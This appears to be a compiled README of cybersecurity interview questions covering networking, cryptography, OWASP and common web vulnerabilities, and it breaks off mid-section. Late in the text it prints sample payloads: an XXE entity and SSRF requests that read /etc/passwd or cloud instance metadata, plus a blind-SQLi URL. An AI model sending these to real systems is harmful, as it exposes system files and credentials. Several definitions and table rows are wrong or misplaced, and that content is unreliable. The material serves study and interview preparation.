**Disclaimer:**
The content presented here does not belong to me in any way. It is a compilation sourced from various domains, and due credit and respect are given to the original creators. I do not endorse or support any unethical activities, and this content is intended solely for educational purposes.

**Note:**
Based on my personal experience, the following list comprises some commonly encountered interview questions. However, I cannot guarantee that interview questions will be 100% derived from this repository.

### Awesome Interview Links: For (freshers)
| S.N | Link                                                                                         | By    |
|-----|----------------------------------------------------------------------------------------------|-------------|
| 1   | [Cyber Security Interview Questions - Part 1](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-1-ae00b96c5610) | [Shifa cyclewala](#) |
| 2   | [Cyber Security Interview Questions - Part 2](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-2-13fbb38b9b46) | [Shifa cyclewala](#) |
| 3   | [Cyber Security Interview Questions - Part 3](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-3-2238f36cbe76) | [Shifa yclewala](#) |
| 4   | [Cyber Security Interview Questions - Part 4](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-4-a28f8829d541) | [Shifa cyclewala](#) |
| 5   | [Cyber Security Interview Questions - Part 5](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-5-5be559408234) | [Shifa cyclewala](#) |

### Top 100 Web application Vulnerability and Mitigation: ( Experianced)

| S.N | Link                                                                                         | By    |
|-----|----------------------------------------------------------------------------------------------|-------------|
| 1   | [Top 100 Web Application Vulnerability and Mitigation](https://github.com/m14r41/Interview-CyberSecurity/blob/main/VAPT/Top%20100%20-%20Web%20Vulnerability%20and%20Mitigation.pdf) | [Unknown](#) |

## Dedicated for Freshers, also asked with experianced condidates some questions.
  **Top 20 from list are strongly recommended.**

### 1. Information Security

> Information security is the process employed to safeguard information in any form (physical or electronic) from unauthorized access, disclosure, and destruction.

> According to NIST, it involves protecting information systems from unauthorized activities to ensure confidentiality, integrity, and availability.

### 2. Cyber Security VS Information Security

### Cyber Security

> Cybersecurity focuses on safeguarding electronic data, preventing unauthorized access, disclosure, alteration, and destruction.

> Its primary goal is to protect digital data and systems from unauthorized access, damage, or disruption.

### Information Security

> Information security is a broader discipline encompassing the protection of all types of assets, whether in hard copy or digital form.

> The main objective of information security is to reduce the risk of cyber-attacks and protect against unauthorized exploitation of systems, networks, and technologies.


### 3. What is CIA Triad ?

>CIA Triad an information security model meant to guide an organization’s security procedures and policies.

>Confidentiality, Integrity, and Availability. These are the three core components of the CIA triad


- ```Confidentiality```
  
  >Confidentiality ensures  access to resources or data must be restricted to only authorized subjects or entities. Data encryption is a common method of ensuring confidentiality.
  
  
- ```Integrity```
  
  Integrity involves maintaining the consistency and accuracy of data over its entire life cycle. 
  
  Data must not be changed in transit, for example, when it is sent over the Internet or using a local area network
  
 

- ```availability```

  A vulnerability is a flaw, loophole, oversight, or error that can be exploited to violate the system security policy.
  
    For example, software or an application that has code vulnerable to a buffer or flow exploit.
  
### 3. Explain **Vulnerabilty**, **Threats**, **Exploit** and **Risk**.
- ```Vulnerabilty```
  
  >A vulnerability is a flaw, loophole, oversight, or error that can be exploited to violate system security policy. 
  
  >For example, a software or an application that has code vulnerable to a buffer or flow exploit.
  
  
- ```Threats```
  
  >A threat is an event, natural or man-made, able to cause a negative impact on an organization.


- ```Exploit```
  
  
  >An exploit is a defined way to breach the security of an IT system through a vulnerability.
  
  
- ```Risk```
    ```
    It is an situation involving exposure to dange.
    ```
### 4. Define **Indentification**, **Authentication**, and **Authorization**?
- ```Indentification```
  
  >Identification is the process in which the ability to identify uniquely a user of a system or an application that is running in the system.
  
- ```Authentication```
  
  >Process of verifying the identity of the user who claims to be.
  
- ```Authorization?```
  
  >What level of access someone have ,i.e process of granting access and defining the specific resources for a user's needs.
  

### 5. What is 3 way handshake?

>A three-way handshake is a method used in a TCP/IP network to create a connection between a local host/client and server.

- ```Step 1 (SYN):```

    
    >In the first step, the client wants to establish a connection with a server, so it sends a segment with SYN(Synchronize Sequence Number) which informs the server that the client is likely to start communication and with what sequence number it starts segments with
    

- ```Step 2 (SYN + ACK):``` 
    
    >The Server responds to the client request with SYN-ACK signal bits set. Acknowledgement(ACK) signifies the response of the segment it received and SYN signifies with what sequence number it is likely to start the segments with
    

- ```Step 3 (ACK):```
    
    >In the final part client acknowledges the response of the server and they both establish a reliable connection with which they will start the actual data transfer
    
  
  
 ### 6. What is SSL/TLS handshake? 
 
 >In nutshell, SSL is obsolete and TLS is new name of older SSL protocol as modern encryption standard using by everybody. Technically, TLS is more accurate, but everyone knows SSL.
 

```SSL```    | ````TLS````
-------- | ------------
SSL stands for “Secure Socket Layer.” |	TLS stands for “Transport Layer Security.”
Netscape developed the first version of SSL in 1995. |	The first version of TLS was developed by the Internet Engineering Taskforce (IETF) in 1999.
SSL is a cryptographic protocol that uses explicit connections to establish secure communication between web server and client. | TLS is also a cryptographic protocol that  provides secure communication between web server and client via implicit connections. It’s the successor of SSL protocol.
Three versions of SSL have been released: SSL 1.0, 2.0, and 3.0. |	Four versions of TLS have been released: TLS 1.0, 1.1, 1.2, and 1.3.
All versions of SSL have been found vulnerable, and they all have been deprecated. |	TLS 1.0 and 1.1 have been “broken” and are deprecated as of March 2020. TLS 1.2 is the most widely deployed protocol version.

### 7. Accounting V/S Auditing.
- ```Accounting```
    ```
    The Process of tracking and recording system activities and resource access.
    ```
-    ```Auditing```
        ```
     The portion of accounting requires security professionals to examine logs of what was recorded.
        ```


### 8. Give the name of few tools used in penetration testing.

- ```BurpSuite```
    
    Burp or Burp Suite is a set of tools used for penetration testing of web applications. It is developed by the company named Portswigger, 
    
  -   **Proxy:**
        
        >proxy lets the user see and modify the contents of requests and responses while they are in transit.
        -------------------------------------------
        >It also allow to send the  request/response under monitoring to another relevant tool in BurpSuite, that avoids copy paste.
        -------------------------------------------
        >Also allow to configure the proxy.
        
     - **Intruder:**
        
        >Burp Intruder is a tool for automating customized attacks against web applications
        -------------------------------------------
        >Brute-force attacks on password forms, pin forms, and other such forms.
        -------------------------------------------
        >The dictionary attack on password forms, fields that are suspected of being vulnerable to XSS or SQL injection.
        -------------------------------------------
        >Testing and attacking rate limiting on the web-app.
        
     - **Intruder:**
        
        >Burp Repeater is a simple tool for manually manipulating and reissuing individual HTTP requests, and analyzing the application's responses.
        -------------------------------------------
       >Allow send a request to Repeater from anywhere within Burp, modify the request and issue it over and over again.
        
    - **Decoder**
        
        >Decoder lists the common encoding methods like URL, HTML, Base64, Hex, etc. This tool comes handy when looking for chunks of data in values of parameters or headers.
        -----------------------------------------------
        >Decoder lists the common encoding methods like URL, HTML, Base64, Hex, etc.
        
- ```Nessus```
    
    >The Nessus vulnerability scanner is a remote security scanner from Tenable, Inc. 
    

    >Nessus scans a computer and then generates alerts if vulnerabilities are discovered.  Nessus runs over 1,000+ checks to see if vulnerabilities exist.
    

- ```Nikto```
    
    >Nikto is an Open Source software written in Perl language that is used to scan a web-server for the vulnerability that can be exploited and can compromise the server. 
    

    >It can also check for outdated version details of 1200 server and can detect problems with specific version details of over 200 servers.
    
    
    Example : **nikto -host www.example.com
    
- ```Nmap```
    
    >Nmap is a free and open-source network scanner tool. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the  responses.
    
    >Nmap provides a number of features for provding computer networks, including host discovery and service and operating dedection.
    

   - **Ping Scan** Nmap discover host by using a ping scan without sending packets.
      
      ```
      nmap -sp 192.100.1.1/24
      ```
      
   - **Host Scan** responds to this packet with another ARP packet containing its status and MAC address.
      ```
      nmap -sp <target IP range>
      ```
   - **OS Scanning** sends TCP and UDP packets to a particular ports and compares this response to a database of 2600 O/S
   
      ```
      nmap -O <target IP>
      ```
   - **Most Popular Ports** 
      ```
      nmap --top-ports 20 192.168.1.106
      ```
   - **Output to a File**
      ```
      -oN output.txt
      ```
      ```
      -oX output.xml
      ```
   - **Disable DNS Name Resolution**
      ```
      nmap -sp -n 192.100.1.1/24
       ```
       


### **9. Encription VS encoding Vs Hashing** 


- ```Hashing:``` 
    
    >A string of numbers generated to confirm the integrity of data through hashing algorithms.
    
    
    >Hashing is a form of cryptographic security which differs from encryption. Whereas encryption is a two step process used to first encrypt and then decrypt a message, hashing condenses a message into an irreversible fixed-length value, or hash.
    
- ```Encryption:```
    
    >A technique used to maintain the confidentiality of data by converting the data into an undecipherable format.
    
- ```Encoding:```
    
     >A conversion of data from one format to another format.
     
  
 > ### Encription vs Hashing

 |```Encryption``` |	```Hashing``` |
|----------- | ---------|
|A two-way function that takes in plaintext data, and turns it into undecipherable ciphertext.| A one-way method of hiding sensitive data. Using a hashing algorithm, hashing turns a plaintext into a unique hash digest that cannot be reverted to the original plaintext, without considerable effort.|
It is reversible | It is irreversible
Variable Length | 	Fixed Length  
Types :	Asymmetric and Symmetric |	Hashing
Common Algorithms :	AES, RC4, DES, RSA, ECDSA |	SHA-1, SHA-2, MD5, CRC32, WHIRLPOOL

 > ## Encription vs Encoding
 
```symmetric Key Encryption```  | ```Asymmetric Key Encryption```
---------------- | -------------
It only requires a single key for both encryption and decryption.l  |It requires two key one to encrypt and the other one to decrypt.
The encryption process is very fast.  | The encryption process is slow.
It is used when a large amount of data is required to transfer. | It is used to transfer small amount of data.
It only provides confidentiality | It provides confidentiality, authenticity and non-repudiation.
Examples: 3DES, AES, DES and RC4 | Examples: Diffie-Hellman, ECC, El Gamal, DSA and RSA 

### 10. TCP vs UDP

|```TCP``` | ```UDP``` |
|---- | ------|
TCP:Transmission Control Protocol | UDP : User Datagram Protocol
It is a Connection Oriented protocol | It is a Connection less protocol
Acknowledgement is received | Acknowledgment is not received
TCP is comparatively slower than UDP. | UDP is faster, simpler, and more efficient than TCP.
TCP is used by HTTP, HTTPs, FTP, SMTP and Telnet. | UDP is used by DNS, DHCP, TFTP, SNMP, RIP, and VoIP.
UDP is used by DNS, DHCP, TFTP, SNMP, RIP, and VoIP. | There is no retransmission of lost packets in the User Datagram Protocol (UDP)
Retransmission of lost packets is possible in TCP, but not in UDP. | There is no retransmission of lost packets in the User Datagram Protocol (UDP)

### 11. What is OSI Model? 

>OSI stands for Open System Interconnection is a reference model that describes how information from a software application in one computer moves through a physical medium to the software application in another computer.
----------------------------------------
>OSI model consists of seven layers, and each layer performs a particular network function.

>Upper layer of the OSI model mainly deals with the application related issues, and they are implemented only in the software

>He lower layer of the OSI model deals with the data transport issues. The data link layer and the physical layer are implemented in hardware and software. 

- 1.**Application Layer:** HTTP, SMTP - [More on Ports](https://www.geeksforgeeks.org/protocols-application-layer/)
    
    >Application layer interface directly interacts with the application and provides common web application services

    >(Data),LPD, SNMP,DNS, Telnet, DHCP, FTP 
    
- **2.Presentation Layer : SSL, TLS (Data)**
    ```
    Translate, encript, and compress data
    ```
- **3.Session Layer : NetBios, PPTP (Data)**
    ```
    To establish, manage, and terminate session
    ```
- **4.Transport Layer : TCP, UDP (Segment)**
    
    >accept data from the session layer, split it up into smaller units if need be, pass these to the Network layer, Multiplexing  Demultiplexing, Flow control, Error Control
    
- **5.Network Layer : IP (Packet)**
    
    >Internetworking: This is the main duty of network layer
    -----------------------------------------------
    >Addressing: Addressing is necessary to identify each device on the internet uniquely
    -----------------------------------------------
    >Addressing: Addressing is necessary to identify each device on the internet uniquely
    
- **6.Data Link Layer : Bridge, Switch, Ethernet(Frames)**
    
    >framing, error detection and correction, acknowledgement, flow control, ensuring well-defined reliable service interface to the network layer, encapsulating packets from network layer to frames, etc
    
- **7.Physical Layer :Coax, Fiber, Wireless (Bit)**
    
    >This layer controls the way unstructured, raw, bit -stream data is sent and received over a physical medium. This layer is composed of the electrical, optical, and physical components of the network.
    

### 12. TCP/IP Model

>TCP/IP model, it was designed and developed by Department of Defense (DoD) in 1960s and is based on standard protocols. It stands for Transmission Control Protocol/Internet Protocol. The TCP/IP model is a concise version of the OSI model. It contains four layers, unlike seven layers in the OSI model. The layers

- >**1. Process/Application Layer** [Application + Presentation + Session Layer](#) 
- >**2. Host-to-Host/Transport Layer** - [transport layer](#)
- >**3.Internet Layer** - [Network layer](#)
- >**4.Network Access/Link Layer** - [Data Link Layer + Physical Layer](#)

### 13. What is OWASP ?

>OWASP Top 10 is an online document on OWASP’s website that provides ranking of and remediation guidance for the top 10 most critical web application security risks


>"Open Web Application Security Proect" is list of most common web application vulnerabilty. It was first updated in 2013 and now it's latest release is 2021.

- >**A01:2021-Broken Access Control**
- >**A02:2021-Cryptographic Failures**
- >**A03:2021-Injection**
- >**A04:2021-Insecure Design**
- >**A05:2021-Security Misconfiguration**
- >**A06:2021-Vulnerable and Outdated Components**
- >**A07:2021-Identification and Authentication Failures**
- >**A08:2021-Software and Data Integrity Failures**
- >**A09:2021-Security Logging and Monitoring Failures**
- >**A10:2021-Server-Side Request Forgery**

### 14. What is pentesting and types of pentesting


>Penetration testing is also known as pen testing or ethical hacking. It describes the intentional launching of simulated cyberattacks that seek out exploitable vulnerabilities in computer systems, networks, websites, and applications.


>The type of penetration testing normally depends on the scope and the organizational wants and requirements. This can classfied in to 3 types


- ```Black Box Penetration Testing```
    
    In black box penetration testing, tester has no idea about the systems that he is going to test. He is interested to gather information about the target network or system.
    
- ```White Box Penetration Testing```
    
    >It is normally considered as a simulation of an attack by an internal source. It is also known as structural, glass box, clear box, and open box testing.

    >White box penetration testing examines the code coverage and does data flow testing, path testing, loop testing, etc.

- ```Grey Box Penetration Testing```
    
    >In this type of testing, a tester usually provides partial or limited information about the internal details of the program of a system.
    

### 15. What is ports and  most common network ports and services.

>Protocol is a set of rule by definition in computer networking, Protocol is a standard way for computers to exchange information each protocol has a port number assigned to it

>There are 65,535 ports in total

### 16. What is functions of ports
- >**FTP — Port Number : 20,21 :**
    ```
    FTP : File Transfer Protocol
    Use : The purpose of FTP is to transfer files Upload and Download
    ```
- >**SSH — Port 22 :**
    ```
    SSH Secure Shell
    Use : The SSH protocol uses encryption to secure the connection between a client and a server
    It is used for remote login
    ```
- >**Telnet — Port 23 :**
    ```
    Use : Its main function is to establish a connection between a server and a remote computer.
    It is used for remote login
    NOTE: The key difference between Telnet and SSH is that SSH uses encryption,
    which means that all data transmitted over a network is secure , from eavesdropping
    ```
- >**RDP — 3389 :**
    ```
    Remote Desktop Protocol
    This port has been developed by Microsoft. It enables you to establish a connection with a remote computer
    But this time we need a windows device at the other end.
    ```
- >**DNS — 53 :**
    ```
    Domain Name System
    URL to IP Mapping.
    SMTP — 25 :
    Simple mail transfer protocol
    Sending Emails.
    ```
- >**POP3 — 110 :**
    ```
    Post office protocol v3
    Receiving emails.
    ```
- >**IMAP4 — 143:**
    ```
    Internet message access protocol v4
    Receiving emails(new version).
    ```
- >**HTTP — 80 :**
    ```
    hypertext transfer protocol
    Connect to the web pages on the internet
    This is an application layer protocol
    ```
- >**HTTPS — 443 :**

    ```
    Hypertext transfer protocol secure.
    HTTPS is a secure protocol which uses TLS/SSL certificate to ensure the authentication.
    ```
- >**ARP**
    ```
    ARP is a protocol used by the Internet Protocol (IP) [RFC826], to map IP network addresses to the hardware addresses used by a data link protocol

    ARP is used to keep track of all devices that are directly connected IP subnets of the switch

    The switch maintains an ARP table which is made of mapped IP addresses and MAC addresses. 
    
    When a packet needs to be routed to a certain device, the switch looks up the IP address of the device in its ARP table to obtain the MAC address of the destination device. The ARP table includes both static and dynamic addresses.
    ```

| ```Ports``` | `Services`|
| ---- | ----|
|20 |File Transfer Protocol (FTP) Data Transfer
21  | File Transfer Protocol (FTP) Command Control
22  | Secure Shell (SSH)
23  |Telnet - Remote login service, unencrypted text messages
25  |Simple Mail Transfer Protocol (SMTP) E-mail Routing
53 |Domain Name System (DNS) service
80 | Hypertext Transfer Protocol (HTTP) used in World Wide Web
110 |Post Office Protocol (POP3) used by e-mail clients to retrieve e-mail from a server
119 |Network News Transfer Protocol (NNTP)
123 |Network Time Protocol (NTP)
143 |Internet Message Access Protocol (IMAP) Management of Digital Mail
161 |Simple Network Management Protocol (SNMP)
194 |Internet Relay Chat (IRC)
443 |HTTP Secure (HTTPS) HTTP over TLS/SSL

### 14. **What is Bruteforce and how to prevent from it.**

A brute force attack (also known as brute force cracking), is a popular cracking method relies on guessing possible combinations of a targeted password until the correct password is discovered. The longer the password, the more combinations that will need to be tested. 

>### **How to prevent from this.**
- Limit the number of failed login attempts.
- By altering the sshd_config file, you can make the root user unreachable via SSH.
- Instead of using the default port, change it in your sshd config file.
- Make use of Captcha.
- Limit logins to a certain IP address or range of IP addresses.
- Authentication using two factors
- URLs for logging in that are unique
- Keep an eye on the server logs.

### 17. DNS working

1. When searching for a www.example.com,
   
        we are actually searching for www.example.com. 
        The Browser and OS looks within the computer if the related IP address stored in the cache.


2. If no record found then the Operating system queries the "Resolving Name Server" for the records.
   
        The Resolving Name Server is configured within the computer automatically or manually.

        If no enteries in the cache, then the RNS will ask the ROOT Name Servers.


3. The ROOT Name Servers tells where to find the COM name servers or TLD Name Servers.
   
        The RNS takes all this information, puts it in its cache and then goes to TLD Name Servers. 


4. When the RNS queries COM TLD nameservers for www.example.com., TLS ns then tells the address
   
		for example.com. Name Servers which are also called Authoriative Name Servers. The RNS puts all
		this information in its cache and goes to example.com. Authoriative NS.


5. The example.com. Authoriative Name Servers will tell the RNS the related IP address of www.example.com.
   
		This entry is made in the memory of RNS and RNS goes back to the OS. OS then passes this
		information to the browser.

### 18.  SSL/TLS Handshake
   
The above contains the highest SSL version supported
Cipher suites supported
Compresssion methods 
Some random text that will be used in sym key generation


Client	 	                                      Server

1. Server Hello                                
                                            
                               1. SSL version,Cipher suite, hash that 
                                  will be used, compression method 
                                  to be used random string.
   										
											
											
2. Authentication and Pre-Master Secret.
Client authenticates the server certificate.
(e.g. Common Name / Date / Issuer) Client
(depending on the cipher)creates the 
pre-master secret for the session, Encrypts
with the server's public key and sends
the encryptedpre-master 
secret to the server.
												
                     					4. Decryption and Master Secret
      									 Server uses its private key to decrypt the pre-master secret.
      									 Both Server and Client perform steps to generate the master 
                                         secret with the agreed cipher.
5. Encryption with Session Key.
Both client and server exchange 
messages to inform that future
 messages will be encrypted.
		
         		 - Source ( https://www.websecurity.digicert.com/security-topics/how-does-ssl-handshake-work )	


### **19. SSH handshake**
- >**It happens in two steps-**
    ```
	1. Server's identity is authenticated by the client 
   

	2. Client's identity is authenticated by the server
    ```

## 20. **SSL versus TLS**


>SSL Versions 			TLS Versions

- SSLv1					-TLS1.0
- SSLv2					-TLS1.1
- SSLv3(POODLE)			-TLS1.2
- SSLv3.1				-TLS1.3  
    


>SSL 1.0 never publically release because of serious security flaws in the protocol. (Wikipedia - https://en.wikipedia.org/wiki/Transport_Layer_Security#SSL_1.0,_2.0,_and_3.0 )

>Both SSL 2.0, 3.0, TLS 1.0, and 1.1 have been deprecated

 
>SSL is the predecessor to TLS - TLS is the new name for SSL


>HTTPS is HTTP-within-SSL/TLS.


### 21. Some Basic Vulnerabilty and terms.

- >`Application Vulnerabilities`
    
    >Software system flaws or weaknesses in an application that could be exploited to compromise the security of the application.
    >Software system flaws or weaknesses in an application that could be exploited to compromise the security of the application.
    

- >`Buffer Overflow`
    
    >Buffer Overflows occur when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage.
    

- >`Credentials Management`

    >A credentials management attack attempts to breach username/password pairs and take control of user accounts.
    


- >`CRLF Injection`

    >CRLF Injection attacks refer to the special character elements "Carriage Return" and "Line Feed." Exploits occur when an attacker is able to inject a CRLF sequence into an HTTP stream. 
    

- >`Cross-Site Request Forgery`
    
    >Cross-Site Request Forgery (CSRF) is a malicious attack that tricks the user’s web browser to perform undesired actions so that they appear as if an authorized user is performing those actions.
    

- >`Cross-Site Scripting`
    
    >XSS vulnerabilities target scripts embedded in a page that are executed on the client-side (in the user’s web browser) rather than on the server-side. 
    
- >`Directory Traversal`
    
    >Directory traversal is a type of HTTP exploit that is used by attackers to gain unauthorized access to restricted directories and files.
    

- >`Encapsulation`
    
    >Encapsulation refers to a programming approach that revolves around data and functions contained, or encapsulated, within a set of operating instructions.
    

- >`Error Handling`
    
    >Error Handling vulnerabilities occur when a system reveals detailed error messages or codes generated from stack traces, database dumps, and a wide variety of other problems, including out of memory, null pointer exceptions, and network timeout errors.
    
- >`Failure to Restrict URL Access`

    >One of the common vulnerabilities listed on the Open Web Application Security Project’s (OWASP) Top 10. The OWASP Top 10 details the most critical vulnerabilities in web applications. 
    

- >`Insecure Cryptographic Storage`
    
    >Insecure Cryptographic Storage is a common vulnerability that occurs when sensitive data is not stored securely from internal users. 
    

- >`Insufficient Transport Layer Protection`
    
    >Insufficient transport layer protection is a security weakness caused by applications not taking any measures to protect network traffic. 
    
- >`LDAP Injection`
    
    >LDAP injection is the technique of exploiting web applications that use client-supplied data in LDAP statements without first stripping potentially harmful characters from the request. 
    
- >`Malicious Code`
    
    >Analysis tools are designed to uncover any code in any part of a software system or script that is intended to cause undesired effects, security breaches or damage to a system.
    

- >`OS Command Injection`
    
    >Command injection refers to a class of critical application vulnerabilities involving dynamically generated content. Attackers execute arbitrary commands on a host operating system using a vulnerable application.
    

- >`Race Condition`
    
    >A race condition attack happens when a computing system that’s designed to handle tasks in a specific sequence is forced to perform two or more operations simultaneously.
    
- >`SQL Injection`
    
    >SQL injection is a type of web application security vulnerability in which an attacker is able to submit a database SQL command, which is executed by a web application, exposing the back-end database.
    
- >`Null Byte Injection`
    
    >The null character is a control character with the value zero. 

    >It is also possible to pass the null character in the URL, which creates a vulnerability known as Null Byte Injection and can lead to security exploits.
    
    >In the URL it is represented by %00.
     
    
    >Ex- Image with the name hello.gif and can be changed to hello.phpA.gif. Try replacing the hex value of A (\x60) with null byte which is (\x00)
    

- >`Port Knocking :`

    >In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports.
    
- >`Command Injection`

	>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating 

    >system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.
    
- >'`ShellShock Vulnerability`
    
	>Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally.

	>Since the environment variables are not sanitized properly by Bash before being executed, the attacker
	>can send commands to the server through HTTP requests and get them executed by the web server operating system. 

	>An attacker can potentially use CGI to send a malformed environment variable to a vulnerable Web server. Because the server uses Bash to interpret the variable, it will also run any malicious command tacked-on to it.
    

- >`Content Security Policy (CSP)`
    
    >is an added layer of security that helps to detect and mitigate certain types of attacks, including 	
    
    >Cross Site Scripting (XSS) and data injection attacks. 

		Ex-1
		A web site administrator wants all content to come from the site's own origin
		(this excludes subdomains.)

		Content-Security-Policy: default-src 'self'

		Ex-2 
		A web site administrator wants to allow content from a trusted domain and all its subdomains
		(it doesn't have to be the same domain that the CSP is set on.)

		Content-Security-Policy: default-src 'self' *.trusted.com
    
- >`HSTS`

    a. HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header.
    
        Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS.

	b. HSTS does not allow a user to override the invalid certificate message

- >`WebDav`
    
    a. Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol 		(HTTP) that allows clients to perform remote Web content authoring operations.

		b. The WebDAV protocol provides a framework for users to create, change and move documents on a server.

		COPY
   			 copy a resource from one URI to another
		MOVE
  		  move a resource from one URI to another
    
- >`What is API?`
    
	>An application program interface (API) is a set of routines, protocols, and tools for building software applications. Basically,an API specifies how software components should interact. Additionally, 
    
    >APIs are used when programming graphical user interface (GUI) components.
    - Web service APIs
	>Apart from the main web APIs, there are also web service APIs:
		+SOAP
		+XML-RPC
		+JSON-RPC
		+REST
		
	>A web service is a system or software that uses an address, i.e., URL on the World Wide Web, to provide access to its services.

	## **The following are the most common types of web service APIs:**

    - >`SOAP (Simple Object Access Protocol):`
        
        >This is a protocol that uses XML as a format to transfer data. Its main function is to define the structure of the 			messages and method of communication. It also uses WSDL, or Web Services Definition Language, in a machine-readable document to publish a definition of its interface.
        

	- >`XML-RPC:`
        
		>This is a protocol that uses a specific XML format to transfer data compared to SOAP that uses a proprietary XML format. 		 It is also older than SOAP.
        
        >XML-RPC uses minimum bandwidth and is much simpler than SOAP. Example
		><employees>
  		><employee>
   		><firstName>Becky</firstName> <lastName>Smith</>lastName>
        

	- >`SON-RPC:`
        
        >This protocol is similar to XML-RPC but instead of using XML format to transfer data it uses JSON. Example
		>{"employees":[
		>{"firstName":"Becky", "lastName":"Smith" },
        ```
 
	- >`REST (Representational State Transfer):`
        
		>REST is not a protocol like the other web services, instead, it is a set of architectural principles. 
        
        >The REST service needs to have certain characteristics, including simple interfaces, which are resources identified easily within the request and manipulation of resources using the interface.
        
- >`DOM Based XSS`
    
    >DOM Based XSS simply means a Cross-site scripting vulnerability that appears in the DOM (Document Object Model) instead of part of the HTML.
    
    
    - Occurs entirely on the client side or on the code located in the browser
	- Payload is never sent to the server
	- document.url, document.location, document.referrer, location.href, location.search, document.write
	objects are most popular
    
	
    > **Mitigation**
	
		- HTML encoding and javascript encoding all untrusted input.
		- Avoid client side sensitive actions 
		- You can use the JavaScript built-in functions encode() or encodeURI() to escape data coming from
		  the client's end.

- >`DOM`
    
    >Dom is a tree of objects created by the browser when the webpage is loaded and allows client-side-scripts(Eg: Javascript) to dynamically access and modify the content, structure, and style of a webpage. 
    

- >`What can be done with XSS`
    
    - Cookie stealing leading to session hijacking
    - CSRF token stealing and conducting CSRF attacks
    - Phishing Attacks
    
- >`CORS`
    
    - The Cross-Origin Resource Sharing standard works by adding new HTTP headers that allow servers

    - to describe the set of origins that are permitted to read that information using a web browser.
		  
    - CORS defines the protocol to use between a web browser and a server to determine whether 
    
- >`a cross-origin`
    
    >request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this
    
    
		  process, that are supported by all major browsers and we will cover below including: Origin,
		    Access-Control-Request-Method,
            Access-Control-Request-Headers,
            Access-Control-Allow-Origin,
		    Access-Control-Allow-Credentials
            Access-Control-Allow-Methods, 
            Access-Control-Allow-Headers.
    
    
    >A CORS request must have an Origin header; there is no way around it. If there is no Origin header,
		    it is not CORS. This Origin header is added by the browser, and can not be controlled by the user.
    
		    
	
    >Pre-flight request: Let’s say that your web server does not support CORS, but browsers have implemented CORS. 
		   This means that your web server will get CORS requests that it does not know how to respond to.

		To avoid the element of surprise, the browser sends preflight request and ask servers if they support
		CORS and allow requests with that origin, containing methods and headers. If not, the browser will not
		make the actual request.
		
		GET, POST, HEAD and OPTIONS are all requests that server understands, so no preflight request
		are initiated from browser.
    

- >`Same origin policy`

	>Under the policy, a web browser permits scripts contained in a first web page to access data

	>in a second web page, but only if both web pages have the same origin. An origin is defined 

	>as a combination of URI scheme, hostname, and port number.

- >`XXE Attack (XML External Entity Attack)`

    >ts an attack against an application that parses XML input. This attack occurs when 


    >an XML input containing reference to an external entity is processed by a weakly


- >**configured parser.**
    
    >XML is a kind of format that is used to describe data.

    - Two systems which are running on different technologies can communicate and exchange data with one another using XML.
  
    - XML documents can contain something called          ‘entities’ defined using a system identifier and are present within a DOCTYPE header. These entities can access local or remote content. 
  
    - 1. An attacker forces the XML parser to access the resource specified by him which could be a file on 
    the system or on any remote system.

        <?xml version="1.0" encoding="ISO-8859-1"?>
 	 	 <!DOCTYPE foo [  
  	 	 <!ELEMENT foo ANY >
  	  	 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
	     
		googledork -> allinurl:skin/frontend
	     
			<!DOCTYPE a
			 [<!ENTITY baba "hacked !!!">]
			 >
	     
		 <methodCall><methodName>&baba;</methodName></methodCall>
	 

		Remediation: The best solution would be to configure the XML processor to use a local
		static DTD and 	disallow any declared DTD included in the XML document as input.

        http://resources.infosecinstitute.com/xxe-attacks/#gref

    
- >`SQL`
    
    >SQLi occurs when an application accepts malicious user input that can be used to query the backend database.

        https://www.synopsys.com/software-integrity/resources/knowledge-database/sql-injection.html
        
- **Mitigation:** 
`
    1. Use of prepared statements with parametrized queries. 

			Prepared statements force developers 
			a. to use static SQL query and then (SQL statements are executed first)
			b. pass in the external input as a parameter to query.

			This approach ensures the SQL interpreter always differentiates between code and data.
	
		2. Input validation
		3. Stored Procedures
			SQL statements defined and stored in the database itself and then called from the application. 
			Developers are usually only required to build SQL statements with parameters that are 
			automatically parameterized. 
		4. WAF
   `
 - >`Blind SQL Injection:`
    
    >This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response.
    

    
    >For ex: http://newspaper.com/items.php?id=2 and 1=1 If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false. 

    https://www.youtube.com/watch?v=sJdWuPHKRRY
    
				
         

- > `Second Order SQLi`

	1. Payload is inserted in one page and there isn't an instant response of the injected query.
	2. This payload can be made to call on some other page that thus gets executed.
	3. Similar to stored XSS.
    
    >**`Mitigation:`**
    
    All data being retrieved from the database must be escaped or encoded before using it.
    
 


> `SSRF - Server Side Request Forgery`

>In a server-side request forgery (SSRF) attack, the attacker forces a vulnerable server to issue malicious requests on their behalf.
    
>Server-Side Request Forgery (SSRF) occurs when a web application is making a request, where an attacker has full or partial control of the request that is being sent.
    
>SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network.
    
>Server-Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing.
	
    >Ex- 

			1. GET /?url=file:///etc/passwd HTTP/1.1
			2. Port Scanning
			3. Accessing instance metadata in Amazon EC2 and OpenStack instances. This service is only 
			   available to the server and not to the outside world.
			
			GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
			Host: example.com




> **`Contents of Digital Certificate (there are 2 sections)**`**

-	**Data Section**
    
